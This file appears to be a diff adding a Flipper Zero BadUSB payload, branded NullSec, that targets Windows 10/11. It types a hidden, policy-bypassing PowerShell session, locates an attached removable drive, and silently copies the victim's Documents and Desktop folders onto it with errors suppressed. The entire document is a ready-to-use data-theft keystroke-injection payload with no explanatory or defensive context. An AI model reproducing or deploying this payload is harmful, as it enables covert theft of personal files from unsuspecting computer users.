@@ -1,0 +1,27 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: USB Auto-Exfiltration
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING $usb = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -First 1
+ENTER
+STRING if($usb){
+ENTER
+STRING $dest = "$($usb.DeviceID)\exfil_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+ENTER
+STRING New-Item -ItemType Directory -Force -Path $dest | Out-Null
+ENTER
+STRING Copy-Item "$env:USERPROFILE\Documents\*" $dest -Recurse -ErrorAction SilentlyContinue
+ENTER
+STRING Copy-Item "$env:USERPROFILE\Desktop\*" $dest -Recurse -ErrorAction SilentlyContinue
+ENTER
+STRING }
+ENTER
+STRING exit
+ENTER
